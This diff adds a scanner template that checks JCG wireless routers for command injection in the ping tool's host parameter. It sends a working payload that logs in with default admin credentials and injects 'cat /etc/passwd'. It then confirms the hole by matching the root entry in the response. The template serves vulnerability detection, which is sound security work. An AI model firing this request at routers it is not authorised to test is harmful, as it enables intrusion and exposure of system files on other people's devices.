@@ -1,0 +1,37 @@
+id: jcg-wireless-route-rce
+info:
+  name: JCG Wireless Route Ping Host RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The host parameter of the product in the /goform/sysTools file has a command injection vulnerability. This allows attackers to execute arbitrary commands on the server, potentially gaining administrator-level access.
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzI1ODEzNTEyMw==&mid=2649616821&idx=7&sn=1b1472b50f5243d1928e0e217750f551&scene=0
+  tags: rce
+
+variables:
+  cmd: "cat /etc/passwd"
+
+http:
+  - raw:
+      - |
+        POST /goform/sysTools HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Authorization: Basic YWRtaW46YWRtaW4=
+
+        tool=0&pingCount=4&host=127.0.0.1;{{cmd}}&sumbit=%E7%A1%AE%E5%AE%9A
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+    extractors:
+      - type: regex
+        part: body
+        name: response
+        regex:
+          - "readonly=\"1\">(.*?)</textarea>"
